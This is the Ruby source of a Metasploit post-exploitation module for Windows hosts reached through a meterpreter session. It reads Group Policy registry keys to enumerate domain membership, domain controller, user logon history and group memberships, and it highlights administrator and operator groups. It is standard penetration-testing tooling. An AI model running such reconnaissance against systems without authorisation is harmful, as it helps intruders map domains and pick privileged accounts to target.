require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'msf/core/post/windows/extapi'
require 'sqlite3'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::ExtAPI
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report
  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Collect Basic Information on a Windows Host.',
      'Description'   => %q{
        Collect Information on a Windows Host and information about the domain it is joined to if domain joined.
      },
      'License'       => BSD_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos.perez[at]trustedsec.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run()
    print_status("Running post module against #{sysinfo['Computer']}")

    get_hostinfo
  end

  def get_hostinfo()
    print_status("######################")
    print_status("# System Information #")
    print_status("######################")
    print_line
    print_status("Target base information:")
    print_good("\tHostname: #{sysinfo['Computer']}")
    print_good("\tDomain: #{sysinfo['Domain']}")
    print_good("\tOS: #{sysinfo['OS']}")
    print_good("\tArchitecture: #{sysinfo['Architecture']}")
    print_good("\tSystem Language: #{sysinfo['System Language']}")
    print_good("\tLogged On Users: #{sysinfo['Logged On Users']}")
    print_line

    print_status("##########################")
    print_status("# Domain Membership Info #")
    print_status("##########################")
    print_line

    print_status('Getting domain membership basic information')
    domajoin = get_dn
    print_good("\tIn Domain: #{domajoin[:in_domain]}")
    print_good("\tDomain Controller: #{domajoin[:domain_controller]}")
    print_good("\tDomain FQDN: #{domajoin[:domain_fqdn]}")
    print_good("\tDomain DN: #{domajoin[:domain_dn]}")
    print_good("\tMachine DN: #{domajoin[:machine_dn]}")
    print_good("\tMachine Site: #{domajoin[:machine_site]}")

    report_note(
        :host   => session.session_host,
        :type   => 'host.info.domain',
        :data   => domajoin ,
        :update => :unique_data)
    print_line

    print_status("################")
    print_status("# User History #")
    print_status("################")
    print_line
    user_history = get_userhistory
    user_history.each do |user|
      print_good("\tUser: #{user[:account]}")
      print_good("\tSID: #{user[:sid]}")
      print_good("\tDate: #{user[:date]}")
      print_good("\tUserDN: #{user[:userdn]}")
      print_line
    end
    report_note(
      :host   => session.session_host,
      :type   => 'host.info.user_history',
      :data   => user_history ,
      :update => :unique_data)
    get_grouphistory(user_history)
  end

    # Method for getting domain membership info.
  #---------------------------------------------------------------------------------------------
  def get_dn
    domain_membership = {
      in_domain: false,
      domain_dn: '',
      domain_fqdn: '',
      domain_controller: ''
    }

    begin

      machine_subkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore\Machine\0'
      subkey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History'
      v_name = 'DCName'
      key_vals = registry_enumvals(subkey)
      vprint_status('checking if host is in a domain')
      if key_vals.include?(v_name)
        vprint_status('Host appears to be in a domain.')
        domain_membership[:in_domain] = true
        domain_dc = registry_getvaldata(subkey, v_name)
        domain_membership[:domain_controller] = domain_dc
        # lets parse the information
        dom_info = domain_dc.split('.')
        fqdn = "#{dom_info[1,dom_info.length].join('.')}"
        dn = "DC=#{dom_info[1,dom_info.length].join(',DC=')}"
        machine_dn = registry_getvaldata(machine_subkey, 'DNName')
        machine_site = registry_getvaldata(machine_subkey, 'SiteName')


        domain_membership[:domain_fqdn] = fqdn
        domain_membership[:domain_dn] = dn
        domain_membership[:machine_dn] = machine_dn
        domain_membership[:machine_site] = machine_site

      else
        vprint_status('Host is not part of a domain.')
      end
    rescue
      vprint_error('Could not determine if the host is part of a domain.')
      return domain_membership
    end
    domain_membership
  end

  def get_userhistory
    users = []
    data_storekey = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore'
    userkeys = registry_enumkeys(data_storekey)
    userkeys.each do |uk| 
      user_info = {}
      if uk =~ /^S-\d-\d+-(\d+-){1,14}\d+$/
        account_name = registry_getvaldata("#{data_storekey}\\#{uk}\\0", 'szName')
        next if account_name =~ /defaultuser0$/
        user_info[:sid] = uk
        user_vals = registry_enumvals("#{data_storekey}\\#{uk}\\0")
        user_info[:account] = account_name
        user_info[:date] = registry_getvaldata("#{data_storekey}\\#{uk}\\0","RefreshDateTime")
        if user_vals.include?("DNName")
          user_info[:userdn] = registry_getvaldata("#{data_storekey}\\#{uk}\\0", 'DNName')
          user_info[:type] = "Domain"
        else
          user_info[:userdn] = ""
          user_info[:type] = "Local"
        end
        users << user_info
      end
      
    end
    return users
  end

  # Get the group history for each logged on user. 
  def get_grouphistory(users)
    known_group_sids = {
      'S-1-5-113' => 'Local Account',
      'S-1-5-114' => 'Local Administrator',
      'S-1-1-0' => 'Everyone',
      'S-1-5-32-545' => 'Builtin Group',
      'S-1-5-32-544' => 'Builtin Administrator',
      'S-1-5-4' => 'Interactive Logon',
      'S-1-2-0' => 'Local Logon',
      'S-1-2-1' => 'Console Logon',
      'S-1-5-11' => 'Authenticated User',
      'S-1-5-15' => 'This Organization',
      'S-1-5-13' => 'Terminal Service Logon',
      'S-1-5-6' => 'Service Logon',
      'S-1-5-2' => 'Network Logon',
      'S-1-18-5' => 'Multi Factor Authentication',
      'S-1-5-32-578' => 'Hyper-V Admins',
      'S-1-5-9' => 'Domain Controller',
      'S-1-5-14' => 'Remote Interactive Logon',
      'S-1-5-17' => 'IUSR',
      'S-1-5-18' => 'Local System',
      'S-1-5-19' => 'Local Service',
      'S-1-5-20' => 'Network Service',
      'S-1-5-32-546' => 'BuiltIn Guests',
      'S-1-5-32-547' => 'BuiltIn PowerUser',
      'S-1-5-32-548' => 'Account Operators',
      'S-1-5-32-549' => 'Server Operators',
      'S-1-5-32-550' => 'Printer Operators',
      'S-1-5-32-551' => 'Backup Operators',
      'S-1-5-32-555' => 'Remote Desktop',
      'S-1-16-12288' => 'High Integrity Level',
      'S-1-18-1' => 'Asserted Identiry',
      'S-1-5-64-10' => 'NTLM Authentication',
      'S-1-16-8192' => 'Medium Integrity'
    }

    dom_known_rids = {
      '498' => 'Domain Controllers',
      '500' => 'Machine Administrator',
      '501' => 'Machine Guest',
      '502' => 'KRBGT',
      '512' => 'Domain Admins',
      '513' => 'Domain Users',
      '514' => 'Domain Guests',
      '515' => 'Domain Computer',
      '516' => 'Domain Controller',
      '517' => 'Cert Publisher',
      '518' => 'Schema Administrator',
      '519' => 'Enterprise Administrators',
      '520' => 'GPO Creator/Owner',
      '521' => 'RODC',
      '522' => 'Clonable Controllers',
      '525' => 'Protected Users',
      '526' => 'Key Admins',
      '527' => 'Enterprise Key Admins',
      '553' => 'RAS Server',
      '571' => 'RODC Password Replicator',
      '572' => 'Denied RODC Password Replicator'

    }
    reg_key = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy'
    group_history = []
    users.each do |u|
      results_table = Rex::Text::Table.new(
        'Header'     => 'Groups',
        'Indent'     => 1,
        'SortIndex'  => 0,
        'Columns'    => ['Name', 'SID']
    )
      print_status("Group Membership for #{u[:account]}")
      groupmembership_key = "#{reg_key}\\#{u[:sid]}\\GroupMembership"
      key_vals = registry_enumvals(groupmembership_key)
      key_vals.each do |g|
        if g =~/Group\d+/
          group_sid = registry_getvaldata(groupmembership_key, g)
          if group_sid =~ /^S-\d-\d+-(\d+-){3,14}\d+$/
            rid = (group_sid.split("-"))[-1]
            if dom_known_rids.key?(rid)
              results_table << [dom_known_rids["#{rid}"], group_sid]
            else
              results_table << [dom_known_rids["#{rid}"], group_sid]
            end
          else
            if known_group_sids.key?(group_sid)
              results_table << [known_group_sids["#{group_sid}"], group_sid]
            else
              results_table << [known_group_sids["#{group_sid}"], group_sid]
            end
          end
        end
      end
      results_table.to_s.each_line do |l|
        if l =~ /admin|operator|owner/i
          print_line("%red#{l.chomp}%clr")
        elsif l =~ /term|network|service/i
          print_line("%yel#{l.chomp}%clr")
        else
          print_line(l.chomp)
        end
      end
      print_line
      report_note(
        :host   => session.session_host,
        :type   => 'host.info.user_groups',
        :data   => {
          :user => u[:account],
          :data => results_table.to_csv} ,
        :update => :unique_data)
    end
  end


end